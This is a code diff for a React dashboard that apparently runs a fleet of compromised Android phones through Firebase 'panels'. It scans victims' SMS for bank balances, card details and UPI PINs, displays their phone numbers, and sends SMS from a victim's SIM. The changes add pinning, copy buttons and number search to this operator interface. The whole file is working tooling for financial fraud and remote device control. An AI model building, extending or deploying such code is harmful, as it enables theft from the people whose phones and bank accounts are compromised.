         <div style={{position:"relative",flex:1,minWidth:200,maxWidth:380}}>
           <span style={{position:"absolute",left:12,top:"50%",transform:"translateY(-50%)",color:"var(--muted-2)"}}>{Ic.search(15)}</span>
-          <input value={search} onChange={e=>setSearch(e.target.value)} className="inp" placeholder="Search devices…" style={{paddingLeft:36,padding:"10px 14px 10px 36px"}}/>
+          <input value={search} onChange={e=>setSearch(e.target.value)} className="inp" placeholder="Search by name or number…" style={{paddingLeft:36,padding:"10px 14px 10px 36px"}}/>
         </div>
         <div style={{marginLeft:"auto",display:"flex",alignItems:"center",gap:10,flexWrap:"wrap"}}>
           <div style={{display:"flex",alignItems:"center",gap:8,padding:"7px 14px",borderRadius:999,background:"rgba(52,211,153,.08)",border:"1px solid rgba(52,211,153,.3)"}}>
@@ -1060,8 +1082,7 @@ function Dashboard({fbUrl,fbKey,onLogout}){
 
     {err && <div className="a-up" style={{maxWidth:1400,margin:"10px auto 0",padding:"0 22px",width:"100%"}}>
       <div style={{display:"flex",gap:10,padding:12,borderRadius:12,background:"rgba(244,63,94,.1)",border:"1px solid rgba(244,63,94,.3)",color:"#fb7185"}}>
-        {Ic.alert(15)}<p style={{fontSize:12,flex:1,lineHeight:1.5}}>{err}</p>
-        <button onClick={()=>setErr("")}>{Ic.x(14)}</button>
+        {Ic.alert(15)}<p style={{fontSize:12,flex:1,lineHeight:1.5}}>{err}</p><button onClick={()=>setErr("")}>{Ic.x(14)}</button>
       </div>
     </div>}
 
@@ -1098,7 +1119,7 @@ function Dashboard({fbUrl,fbKey,onLogout}){
             <span className="spin sm"/><span style={{fontSize:11,color:"var(--muted)"}}>Scanning SMS across panels…</span>
           </div>}
           <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(290px,1fr))",gap:16}}>
-            {filtered.map((d,i)=><DeviceCard key={d.id} dev={d} delay={Math.min(i*0.04,0.6)} onClick={()=>setSelected(d)}/>)}
+            {filtered.map((d,i)=><DeviceCard key={d.id} dev={d} delay={Math.min(i*0.04,0.6)} onClick={()=>setSelected(d)} pinned={pinnedIds.includes(d.id)} onTogglePin={togglePinDevice}/>)}
             {filtered.length===0&&<div style={{gridColumn:"1/-1",padding:"70px 20px",textAlign:"center",color:"var(--muted-2)",fontSize:12}}>No devices match your filter</div>}
           </div>
         </>}
@@ -1110,16 +1131,25 @@ function Dashboard({fbUrl,fbKey,onLogout}){
 }
 
 /* ============ DEVICE CARD ============ */
-function DeviceCard({dev,onClick,delay=0}){
+function DeviceCard({dev,onClick,delay=0,pinned,onTogglePin}){
   const bank = dev.smsAnalysis?.bankBalances?.[0];
   const card = dev.smsAnalysis?.cards?.[0];
-  const phone = dev.phoneNumber && dev.phoneNumber!=="—" ? dev.phoneNumber : (dev.smsAnalysis?.phoneNumbers?.[0]||"—");
+  const phoneRaw = dev.phoneNumber && dev.phoneNumber!=="—" ? dev.phoneNumber : (dev.smsAnalysis?.phoneNumbers?.[0]||"—");
+  const phoneShow = cleanPhone(phoneRaw);
   const net = dev.provider && dev.provider!=="—" ? dev.provider : (dev.smsAnalysis?.networks?.[0]||null);
-  const pinCount = (()=>{
-    try{const a = JSON.parse(localStorage.getItem(`pin_msgs_${dev.id}`)||"[]");const b = JSON.parse(localStorage.getItem(`pin_nums_${dev.id}`)||"[]");return a.length+b.length;}catch{return 0;}
-  })();
-  return <div onClick={onClick} className="dev-card pop" style={{animationDelay:`${delay}s`}}>
+  const [copied,setCopied] = useState(false);
+
+  const onCopyPhone = (e)=>{
+    e.stopPropagation();
+    if(!phoneShow || phoneShow==="—") return;
+    try{navigator.clipboard.writeText(phoneShow);}catch{}
+    setCopied(true); setTimeout(()=>setCopied(false),1400);
+  };
+  const onPin = (e)=>{e.stopPropagation();onTogglePin&&onTogglePin(dev.id);};
+
+  return <div onClick={onClick} className={"dev-card pop"+(pinned?" pinned":"")} style={{animationDelay:`${delay}s`}}>
     <div className="shine"/>
+    {pinned && <div className="pin-flag">{Ic.pin(11)} PINNED</div>}
     <div style={{display:"flex",alignItems:"flex-start",gap:12,marginBottom:12}}>
       <div style={{width:42,height:42,borderRadius:13,flexShrink:0,display:"flex",alignItems:"center",justifyContent:"center",
         background:dev.status?"rgba(52,211,153,.13)":"rgba(20,18,40,.6)",
@@ -1130,11 +1160,14 @@ function DeviceCard({dev,onClick,delay=0}){
         <h3 style={{fontSize:14,fontWeight:700,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap",letterSpacing:"-0.01em"}}>{dev.name}</h3>
         <p className="mono" style={{fontSize:10,color:"var(--muted-2)",marginTop:2,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{dev.id}</p>
       </div>
-      <div style={{display:"flex",gap:5,flexShrink:0}}>
+      <div style={{display:"flex",gap:5,flexShrink:0,alignItems:"center"}}>
+        <button onClick={onPin} className="ibtn pin-btn" title={pinned?"Unpin device":"Pin device"}
+          style={{padding:5,color:pinned?"#f472b6":undefined,background:pinned?"rgba(244,114,182,.12)":undefined,borderColor:pinned?"rgba(244,114,182,.35)":undefined}}>
+          {pinned?Ic.pinOff(12):Ic.pin(12)}
+        </button>
         {dev.upipin&&<span style={{color:"#fbbf24",display:"flex"}}>{Ic.zap(14)}</span>}
         {bank&&<span style={{color:"#34d399",display:"flex"}}>{Ic.rupee(14)}</span>}
         {card&&<span style={{color:"#c084fc",display:"flex"}}>{Ic.card(14)}</span>}
-        {pinCount>0&&<span style={{color:"#f472b6",display:"flex"}} title={`${pinCount} pinned`}>{Ic.pin(14)}</span>}
       </div>
     </div>
     <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12,marginBottom:12}}>
@@ -1150,7 +1183,15 @@ function DeviceCard({dev,onClick,delay=0}){
     <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12,marginBottom:12}}>
       <div style={{minWidth:0}}>
         <p style={{fontSize:9,fontWeight:600,textTransform:"uppercase",letterSpacing:"0.13em",color:"var(--muted-2)",marginBottom:4}}>Number</p>
-        <p className="mono" style={{fontSize:11,color:"var(--text)",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{phone}</p>
+        <div style={{display:"flex",alignItems:"center",gap:6,minWidth:0}}>
+          <p className="mono" style={{fontSize:11,color:"var(--text)",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap",flex:1}}>{phoneShow}</p>
+          {phoneShow!=="—" && (
+            <button onClick={onCopyPhone} className="ibtn" title="Copy number"
+              style={{padding:4,flexShrink:0,color:copied?"#34d399":undefined,background:copied?"rgba(52,211,153,.12)":undefined,borderColor:copied?"rgba(52,211,153,.35)":undefined}}>
+              {copied?Ic.check(11):Ic.copy(11)}
+            </button>
+          )}
+        </div>
       </div>
       {net&&<div style={{minWidth:0}}>
         <p style={{fontSize:9,fontWeight:600,textTransform:"uppercase",letterSpacing:"0.13em",color:"var(--muted-2)",marginBottom:4}}>Network</p>
@@ -1200,17 +1241,11 @@ function Row({label,value,mono,color,delay=0,trailing,copyable}){
   };
   return <div className="irow" style={{animationDelay:`${delay}s`}}>
     <span className="k">{label}</span>
-    <span className={`v ${mono?"mono":""}`} style={{
-      color:color||"var(--text)",fontSize:mono?11:12,
-      display:"inline-flex",alignItems:"center",gap:6,justifyContent:"flex-end",minWidth:0
-    }}>
+    <span className={`v ${mono?"mono":""}`} style={{color:color||"var(--text)",fontSize:mono?11:12,display:"inline-flex",alignItems:"center",gap:6,justifyContent:"flex-end",minWidth:0}}>
       <span style={{overflow:"hidden",textOverflow:"ellipsis"}}>{value||"—"}</span>
       {copyable && value && value!=="—" && (
         <button onClick={onCopy} className="ibtn" title="Copy"
-          style={{padding:4,flexShrink:0,
-            color:copied?"#34d399":undefined,
-            background:copied?"rgba(52,211,153,.1)":undefined,
-            borderColor:copied?"rgba(52,211,153,.35)":undefined}}>
+          style={{padding:4,flexShrink:0,color:copied?"#34d399":undefined,background:copied?"rgba(52,211,153,.1)":undefined,borderColor:copied?"rgba(52,211,153,.35)":undefined}}>
           {copied?Ic.check(11):Ic.copy(11)}
         </button>
       )}
@@ -1269,20 +1304,12 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
     if(!/^\+?[0-9]{8,15}$/.test(num)){showToast("Invalid phone number");return;}
     setSending(true);
     try{
-      await fbPut(fbUrl,fbKey,`clients/${dev.id}/webhookEvent/sendSms`,{
-        from: Number(sim)||1,
-        to: num,
-        message: txt,
-        isSended: false
-      });
-      showToast("✉️ SMS queued successfully!");
-      setBody("");
-    }catch(e){
-      const m = e.message||String(e);
+      await fbPut(fbUrl,fbKey,`clients/${dev.id}/webhookEvent/sendSms`,{from: Number(sim)||1, to: num, message: txt, isSended: false});
+      showToast("✉️ SMS queued successfully!"); setBody("");
+    }catch(e){const m=e.message||String(e);
       if(m.includes("PERMISSION_DENIED")) showToast("Firebase denied write access");
       else if(m.includes("HTTP 404")) showToast("Command path not found on device");
-      else showToast("Send failed: "+m.slice(0,80));
-    }
+      else showToast("Send failed: "+m.slice(0,80));}
     finally{setSending(false);}
   }
   async function del(){
@@ -1290,15 +1317,11 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
     try{await fbDel(fbUrl,fbKey,`clients/${dev.id}`);showToast("🗑️ Device deleted");onDelete();}
     catch(e){showToast("Delete failed");}
   }
-  const phone = dev.phoneNumber&&dev.phoneNumber!=="—"?dev.phoneNumber:(ana.phoneNumbers[0]||"—");
+  const phone = cleanPhone(dev.phoneNumber&&dev.phoneNumber!=="—"?dev.phoneNumber:(ana.phoneNumbers[0]||"—"));
   const net = dev.provider&&dev.provider!=="—"?dev.provider:(ana.networks[0]||"—");
 
-  const togglePinMsg = (key)=>{
-    setPinnedMsgs(prev=> prev.includes(key) ? prev.filter(k=>k!==key) : [...prev,key]);
-  };
-  const togglePinNum = (num)=>{
-    setPinnedNums(prev=> prev.includes(num) ? prev.filter(k=>k!==num) : [...prev,num]);
-  };
+  const togglePinMsg = (key)=>{setPinnedMsgs(prev=> prev.includes(key) ? prev.filter(k=>k!==key) : [...prev,key]);};
+  const togglePinNum = (num)=>{setPinnedNums(prev=> prev.includes(num) ? prev.filter(k=>k!==num) : [...prev,num]);};
 
   const tabs = [
     {k:"info",l:"Info"},
@@ -1311,10 +1334,7 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
   const msgKey = (m,i)=>`${m.time}|${m.sender}|${m.text.slice(0,40)}|${i}`;
   const sortedMsgs = useMemo(()=>{
     const withMeta = msgs.map((m,i)=>({m,i,k:msgKey(m,i),ts:parseSmsTime(m.time)}));
-    withMeta.sort((a,b)=>{
-      if(b.ts!==a.ts) return b.ts-a.ts;
-      return b.i-a.i;
-    });
+    withMeta.sort((a,b)=>{if(b.ts!==a.ts) return b.ts-a.ts;return b.i-a.i;});
     const pinned = withMeta.filter(x=>pinnedMsgs.includes(x.k));
     const rest = withMeta.filter(x=>!pinnedMsgs.includes(x.k));
     return [...pinned, ...rest];
@@ -1371,13 +1391,12 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
           <Row label="CPU Arch" value={dev.cpu} mono delay={0.12}/>
           <Row label="SDK" value={dev.sdk} delay={0.14}/>
           <Row label="SIM Cards" value={`${dev.sims.length} SIM(s)`} delay={0.16}/>
-          {dev.sims.map((s,i)=>s.phoneNumber&&<Row key={i} label={`SIM ${i+1}`} value={s.phoneNumber} mono delay={0.18+i*0.02} copyable/>)}
-
+          {dev.sims.map((s,i)=>s.phoneNumber&&<Row key={i} label={`SIM ${i+1}`} value={cleanPhone(s.phoneNumber)} mono delay={0.18+i*0.02} copyable/>)}
           {ana.phoneNumbers.length>0&&<>
             <p style={{fontSize:10,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",fontWeight:700,margin:"18px 0 8px"}}>From SMS · Pin numbers</p>
             {ana.phoneNumbers.map((p,i)=>{
               const isPinned = pinnedNums.includes(p);
-              return <Row key={i} label={`Phone #${i+1}`} value={p} mono color={isPinned?"#f472b6":"#a5f3fc"} delay={0.22+i*0.03} copyable
+              return <Row key={i} label={`Phone #${i+1}`} value={cleanPhone(p)} mono color={isPinned?"#f472b6":"#a5f3fc"} delay={0.22+i*0.03} copyable
                 trailing={<button onClick={()=>togglePinNum(p)} className="ibtn" style={{padding:4,color:isPinned?"#f472b6":undefined,background:isPinned?"rgba(244,114,182,.1)":undefined,borderColor:isPinned?"rgba(244,114,182,.3)":undefined}}>{isPinned?Ic.pinOff(11):Ic.pin(11)}</button>}
               />;
             })}
@@ -1385,10 +1404,7 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
           {ana.networks.length>0&&ana.networks.map((n,i)=><Row key={i} label={`Network #${i+1}`} value={n} color="#c084fc" delay={0.3+i*0.03}/>)}
         </div>}
         {tab==="bank"&&<div style={{padding:"14px 16px",display:"flex",flexDirection:"column",gap:10}}>
-          {loading ? <div style={{textAlign:"center",padding:"50px 20px"}}>
-            <span className="spin" style={{display:"inline-block",marginBottom:10}}/>
-            <p style={{fontSize:12,color:"var(--muted)"}}>Scanning bank SMS…</p>
-          </div>
+          {loading ? <div style={{textAlign:"center",padding:"50px 20px"}}><span className="spin" style={{display:"inline-block",marginBottom:10}}/><p style={{fontSize:12,color:"var(--muted)"}}>Scanning bank SMS…</p></div>
           : ana.bankBalances.length===0 ? <div style={{textAlign:"center",padding:"50px 20px"}}>
               <span style={{color:"var(--muted-2)",display:"inline-flex",marginBottom:10}}>{Ic.rupee(38)}</span>
               <p style={{fontSize:13,fontWeight:600,color:"var(--muted)"}}>No bank SMS found</p>
@@ -1423,10 +1439,7 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
             </button>
           </div>
           <div style={{flex:1,overflowY:"auto",padding:"14px 16px",display:"flex",flexDirection:"column",gap:8}}>
-          {loading ? <div style={{textAlign:"center",padding:"50px 20px"}}>
-              <span className="spin" style={{display:"inline-block",marginBottom:10}}/>
-              <p style={{fontSize:12,color:"var(--muted)"}}>Loading messages…</p>
-            </div>
+          {loading ? <div style={{textAlign:"center",padding:"50px 20px"}}><span className="spin" style={{display:"inline-block",marginBottom:10}}/><p style={{fontSize:12,color:"var(--muted)"}}>Loading messages…</p></div>
           : msgs.length===0 ? <div style={{textAlign:"center",padding:"50px 20px"}}>
               <span style={{color:"var(--muted-2)",display:"inline-flex",marginBottom:10}}>{Ic.msg(38)}</span>
               <p style={{fontSize:13,fontWeight:600,color:"var(--muted)"}}>No messages</p>
@@ -1467,15 +1480,13 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
         {tab==="send"&&<div style={{padding:"18px 20px",display:"flex",flexDirection:"column",gap:16}}>
           <div>
             <p style={{fontSize:10,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",fontWeight:700,marginBottom:8}}>Select SIM</p>
-            <div style={{display:"flex",gap:8}}>
-              {[1,2].map(s=><button key={s} onClick={()=>setSim(s)} className={"btn "+(sim===s?"btn-primary":"btn-ghost")} style={{flex:1}}>SIM {s}</button>)}
-            </div>
+            <div style={{display:"flex",gap:8}}>{[1,2].map(s=><button key={s} onClick={()=>setSim(s)} className={"btn "+(sim===s?"btn-primary":"btn-ghost")} style={{flex:1}}>SIM {s}</button>)}</div>
           </div>
           <div>
             <p style={{fontSize:10,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",fontWeight:700,marginBottom:8}}>Recipient</p>
             <input className="inp mono" value={to} onChange={e=>setTo(e.target.value)} placeholder="+919876543210" inputMode="tel" autoComplete="off"/>
             {pinnedNums.length>0&&<div style={{display:"flex",gap:6,flexWrap:"wrap",marginTop:8}}>
-              {pinnedNums.map((n,i)=><button key={i} onClick={()=>setTo(n)} className="badge" style={{background:"rgba(244,114,182,.08)",borderColor:"rgba(244,114,182,.3)",color:"#f472b6",cursor:"pointer"}}>{Ic.pin(9)} {n}</button>)}
+              {pinnedNums.map((n,i)=><button key={i} onClick={()=>setTo(n)} className="badge" style={{background:"rgba(244,114,182,.08)",borderColor:"rgba(244,114,182,.3)",color:"#f472b6",cursor:"pointer"}}>{Ic.pin(9)} {cleanPhone(n)}</button>)}
             </div>}
           </div>
           <div>
@@ -1486,9 +1497,7 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
           <button onClick={send} disabled={sending} className="btn btn-primary" style={{width:"100%",padding:14}}>
             {sending?<><span className="spin" style={{borderTopColor:"#fff"}}/>Sending…</>:<>{Ic.send(15)}Send via SIM {sim}</>}
           </button>
-          {phone&&phone!=="—"&&<button onClick={()=>setTo(phone)} className="btn btn-ghost" style={{width:"100%"}}>
-            Use device number: <span className="mono" style={{color:"#a5f3fc"}}>{phone}</span>
-          </button>}
+          {phone&&phone!=="—"&&<button onClick={()=>setTo(phone)} className="btn btn-ghost" style={{width:"100%"}}>Use device number: <span className="mono" style={{color:"#a5f3fc"}}>{phone}</span></button>}
         </div>}
       </div>
     </div>
@@ -1501,35 +1510,18 @@ function BankCard({balance,delay=0}){
     <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:10,flexWrap:"wrap",gap:6}}>
       <div style={{display:"flex",alignItems:"center",gap:8,minWidth:0}}>
         <div style={{width:26,height:26,borderRadius:9,background:"rgba(52,211,153,.14)",border:"1px solid rgba(52,211,153,.3)",display:"flex",alignItems:"center",justifyContent:"center",color:"#34d399"}}>{Ic.rupee(13)}</div>
-        <div style={{minWidth:0}}>
-          <span style={{fontSize:11,fontWeight:700,color:"#34d399",display:"block"}}>{balance.bankName}</span>
-          <span className="mono" style={{fontSize:9,color:"var(--muted-2)"}}>{balance.senderName}</span>
-        </div>
+        <div style={{minWidth:0}}><span style={{fontSize:11,fontWeight:700,color:"#34d399",display:"block"}}>{balance.bankName}</span><span className="mono" style={{fontSize:9,color:"var(--muted-2)"}}>{balance.senderName}</span></div>
         {balance.accountLast4&&<span className="mono" style={{fontSize:9,color:"var(--muted-2)",background:"rgba(5,5,10,.5)",padding:"2px 6px",borderRadius:5}}>••{balance.accountLast4}</span>}
       </div>
-      {balance.transactionType&&<span className="badge" style={{background:isCredit?"rgba(52,211,153,.1)":"rgba(244,63,94,.1)",borderColor:isCredit?"rgba(52,211,153,.3)":"rgba(244,63,94,.3)",color:isCredit?"#34d399":"#fb7185"}}>
-        <span style={{display:"flex"}}>{isCredit?Ic.trendUp(10):Ic.trendDown(10)}</span>{isCredit?"Credit":"Debit"}
-      </span>}
+      {balance.transactionType&&<span className="badge" style={{background:isCredit?"rgba(52,211,153,.1)":"rgba(244,63,94,.1)",borderColor:isCredit?"rgba(52,211,153,.3)":"rgba(244,63,94,.3)",color:isCredit?"#34d399":"#fb7185"}}><span style={{display:"flex"}}>{isCredit?Ic.trendUp(10):Ic.trendDown(10)}</span>{isCredit?"Credit":"Debit"}</span>}
     </div>
     <div style={{display:"flex",alignItems:"flex-end",justifyContent:"space-between",gap:10}}>
-      <div>
-        <p style={{fontSize:9,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",marginBottom:2}}>Available</p>
-        <p style={{fontSize:20,fontWeight:800,color:"#fff",fontVariantNumeric:"tabular-nums"}}><span style={{color:"#34d399",fontSize:14}}>₹</span>{fmtMoney(balance.availableBalance)}</p>
-      </div>
-      {balance.transactionAmount&&balance.transactionAmount!==balance.availableBalance&&<div style={{textAlign:"right"}}>
-        <p style={{fontSize:9,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",marginBottom:2}}>Txn</p>
-        <p style={{fontSize:14,fontWeight:700,color:isCredit?"#34d399":"#fb7185",fontVariantNumeric:"tabular-nums"}}>{isCredit?"+":"-"}₹{fmtMoney(balance.transactionAmount)}</p>
-      </div>}
+      <div><p style={{fontSize:9,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",marginBottom:2}}>Available</p><p style={{fontSize:20,fontWeight:800,color:"#fff",fontVariantNumeric:"tabular-nums"}}><span style={{color:"#34d399",fontSize:14}}>₹</span>{fmtMoney(balance.availableBalance)}</p></div>
+      {balance.transactionAmount&&balance.transactionAmount!==balance.availableBalance&&<div style={{textAlign:"right"}}><p style={{fontSize:9,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",marginBottom:2}}>Txn</p><p style={{fontSize:14,fontWeight:700,color:isCredit?"#34d399":"#fb7185",fontVariantNumeric:"tabular-nums"}}>{isCredit?"+":"-"}₹{fmtMoney(balance.transactionAmount)}</p></div>}
     </div>
     {(balance.phoneFromSms||balance.networkFromSms)&&<div style={{display:"flex",gap:12,marginTop:10,paddingTop:10,borderTop:"1px solid rgba(52,211,153,.14)",flexWrap:"wrap"}}>
-      {balance.phoneFromSms&&<div style={{display:"flex",alignItems:"center",gap:5}}>
-        <span style={{color:"#a5f3fc",display:"flex"}}>{Ic.phone(12)}</span>
-        <span className="mono" style={{fontSize:10,color:"var(--muted)"}}>{balance.phoneFromSms}</span>
-      </div>}
-      {balance.networkFromSms&&<div style={{display:"flex",alignItems:"center",gap:5}}>
-        <span style={{color:"#c084fc",display:"flex"}}>{Ic.signal(12)}</span>
-        <span style={{fontSize:10,color:"var(--muted)"}}>{balance.networkFromSms}</span>
-      </div>}
+      {balance.phoneFromSms&&<div style={{display:"flex",alignItems:"center",gap:5}}><span style={{color:"#a5f3fc",display:"flex"}}>{Ic.phone(12)}</span><span className="mono" style={{fontSize:10,color:"var(--muted)"}}>{cleanPhone(balance.phoneFromSms)}</span></div>}
+      {balance.networkFromSms&&<div style={{display:"flex",alignItems:"center",gap:5}}><span style={{color:"#c084fc",display:"flex"}}>{Ic.signal(12)}</span><span style={{fontSize:10,color:"var(--muted)"}}>{balance.networkFromSms}</span></div>}
     </div>}
   </div>;
 }
@@ -1564,23 +1556,26 @@ function MergedView({onLogout}){
   const [selected,setSelected] = useState(null);
   const [msg,setMsg] = useState("");
   const [now,setNow] = useState(new Date());
+  const [pinnedIds,setPinnedIds] = useState(()=>loadPinnedDevices());
   const ref = useRef([]);
   const cache = useRef(new Map());
   const toast = useCallback(m=>{setMsg(m);setTimeout(()=>setMsg(""),3200)},[]);
   ref.current = devices;
+
+  const togglePinDevice = useCallback((id)=>{
+    setPinnedIds(prev=>{const next = prev.includes(id) ? prev.filter(x=>x!==id) : [...prev,id];savePinnedDevices(next);return next;});
+  },[]);
 
   const load = useCallback(async (showLoad=false)=>{
     if(!accounts.length) return;
     if(showLoad) setLoading(true);
     try{
       const results = await Promise.all(accounts.map(async a=>{
-        try{const raw = await fbGet(a.url,a.key,"clients");
-          return parseDevices(raw).map(d=>({...d,srcId:a.id,srcUrl:a.url,srcKey:a.key}));
-        }catch{return [];}
+        try{const raw = await fbGet(a.url,a.key,"clients");return parseDevices(raw).map(d=>({...d,srcId:a.id,srcUrl:a.url,srcKey:a.key}));}
+        catch{return [];}
       }));
       const merged = results.flat();
-      setDevices(p=>{const old=new Map(p.map(d=>[`${d.srcId}:${d.id}`,d]));
-        return merged.map(d=>({...d,smsAnalysis:old.get(`${d.srcId}:${d.id}`)?.smsAnalysis||cache.current.get(`${d.srcId}:${d.id}`)?.smsAnalysis}));});
+      setDevices(p=>{const old=new Map(p.map(d=>[`${d.srcId}:${d.id}`,d]));return merged.map(d=>({...d,smsAnalysis:old.get(`${d.srcId}:${d.id}`)?.smsAnalysis||cache.current.get(`${d.srcId}:${d.id}`)?.smsAnalysis}));});
     }catch{toast("Unable to load panels");}
     finally{setLoading(false);}
   },[accounts,toast]);
@@ -1604,24 +1599,27 @@ function MergedView({onLogout}){
     }finally{setScanning(false);}
   },[]);
 
-  useEffect(()=>{
-    load(true);
-    const t1 = setInterval(()=>load(false),15000);
-    const t2 = setInterval(()=>scan(true),45000);
-    const t3 = setInterval(()=>setNow(new Date()),1000);
-    return ()=>{clearInterval(t1);clearInterval(t2);clearInterval(t3);};
-  },[]);
+  useEffect(()=>{load(true);const t1=setInterval(()=>load(false),15000);const t2=setInterval(()=>scan(true),45000);const t3=setInterval(()=>setNow(new Date()),1000);
+    return ()=>{clearInterval(t1);clearInterval(t2);clearInterval(t3);};},[]);
   useEffect(()=>{if(devices.length) scan(false);},[devices.length,scan]);
 
-  const filtered = useMemo(()=>devices.filter(d=>{
-    if(filter==="online"&&!d.status) return false;
-    if(filter==="offline"&&d.status) return false;
-    const q = search.toLowerCase().trim();
-    return !q || d.name.toLowerCase().includes(q) || d.phoneNumber.includes(q) || d.id.toLowerCase().includes(q) || d.srcUrl.toLowerCase().includes(q);
-  }).sort((a,b)=>{
-    if(filter==="online") return Number(b.status)-Number(a.status);
-    return b.id.localeCompare(a.id);
-  }),[devices,filter,search]);
+  const filtered = useMemo(()=>{
+    const qRaw = search.trim().toLowerCase();
+    const qNum = qRaw.replace(/[^0-9]/g,"");
+    return devices.filter(d=>{
+      if(filter==="online"&&!d.status) return false;
+      if(filter==="offline"&&d.status) return false;
+      if(!qRaw) return true;
+      const numStr = String(d.phoneNumber||"").replace(/[^0-9]/g,"");
+      const smsNums = (d.smsAnalysis?.phoneNumbers||[]).join(" ").replace(/[^0-9]/g,"");
+      return d.name.toLowerCase().includes(qRaw) || d.id.toLowerCase().includes(qRaw) || d.srcUrl.toLowerCase().includes(qRaw) || (qNum && (numStr.includes(qNum) || smsNums.includes(qNum)));
+    }).sort((a,b)=>{
+      const pa = pinnedIds.includes(a.id), pb = pinnedIds.includes(b.id);
+      if(pa!==pb) return pb?1:-1;
+      if(filter==="online") return Number(b.status)-Number(a.status);
+      return b.id.localeCompare(a.id);
+    });
+  },[devices,filter,search,pinnedIds]);
 
   const online = devices.filter(d=>d.status).length;
   const offline = devices.length-online;
@@ -1647,7 +1645,7 @@ function MergedView({onLogout}){
         </div>
         <div style={{position:"relative",flex:1,minWidth:200,maxWidth:380}}>
           <span style={{position:"absolute",left:12,top:"50%",transform:"translateY(-50%)",color:"var(--muted-2)"}}>{Ic.search(15)}</span>
-          <input value={search} onChange={e=>setSearch(e.target.value)} className="inp" placeholder="Search all panels…" style={{padding:"10px 14px 10px 36px"}}/>
+          <input value={search} onChange={e=>setSearch(e.target.value)} className="inp" placeholder="Search by name or number…" style={{padding:"10px 14px 10px 36px"}}/>
         </div>
         <div style={{marginLeft:"auto",display:"flex",gap:8,alignItems:"center",flexWrap:"wrap"}}>
           <span className="badge" style={{background:"rgba(34,211,238,.08)",borderColor:"rgba(34,211,238,.3)",color:"#a5f3fc",padding:"6px 12px"}}>{accounts.length} panels</span>
@@ -1696,7 +1694,7 @@ function MergedView({onLogout}){
                   <span style={{width:6,height:6,borderRadius:"50%",background:d.status?"#34d399":"#333"}}/>
                   <span className="mono" style={{fontSize:9,color:"var(--muted-2)",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}} title={d.srcUrl}>{d.srcUrl}</span>
                 </div>
-                <DeviceCard dev={d} delay={0} onClick={()=>setSelected({dev:d,account:{url:d.srcUrl,key:d.srcKey}})}/>
+                <DeviceCard dev={d} delay={0} onClick={()=>setSelected({dev:d,account:{url:d.srcUrl,key:d.srcKey}})} pinned={pinnedIds.includes(d.id)} onTogglePin={togglePinDevice}/>
               </div>
             ))}
             {filtered.length===0&&<div style={{gridColumn:"1/-1",padding:"70px 20px",textAlign:"center",color:"var(--muted-2)",fontSize:12}}>No devices match filter</div>}
@@ -1714,11 +1712,7 @@ function CursorGlow(){
   useEffect(()=>{
     let x=-500,y=-500,tx=-500,ty=-500,raf;
     const move = e=>{tx=e.clientX;ty=e.clientY;};
-    const loop = ()=>{
-      x += (tx-x)*0.18; y += (ty-y)*0.18;
-      if(el.current) el.current.style.transform = `translate3d(${x}px,${y}px,0)`;
-      raf = requestAnimationFrame(loop);
-    };
+    const loop = ()=>{x += (tx-x)*0.18; y += (ty-y)*0.18;if(el.current) el.current.style.transform = `translate3d(${x}px,${y}px,0)`;raf = requestAnimationFrame(loop);};
     window.addEventListener("mousemove",move,{passive:true});
     raf = requestAnimationFrame(loop);
     return ()=>{window.removeEventListener("mousemove",move);cancelAnimationFrame(raf);};
@@ -1728,11 +1722,19 @@ function CursorGlow(){
 
 /* ============ APP ============ */
 function App(){
+  const [welcomeDone,setWelcomeDone] = useState(()=>{
+    try{return localStorage.getItem(WELCOME_KEY)==="1";}catch{return false;}
+  });
   const [acc,setAcc] = useState(null);
   const [merged,setMerged] = useState(false);
   const connect = (url,key)=>{setMerged(false);setAcc({url,key});};
   const logout = ()=>{setAcc(null);setMerged(false);};
   const mergeAll = ()=>{setAcc(null);setMerged(true);};
+
+  if(!welcomeDone){
+    return <WelcomeGate onEnter={()=>setWelcomeDone(true)}/>;
+  }
+
   return <>
     <CursorGlow/>
     {merged ? <MergedView onLogout={logout}/>
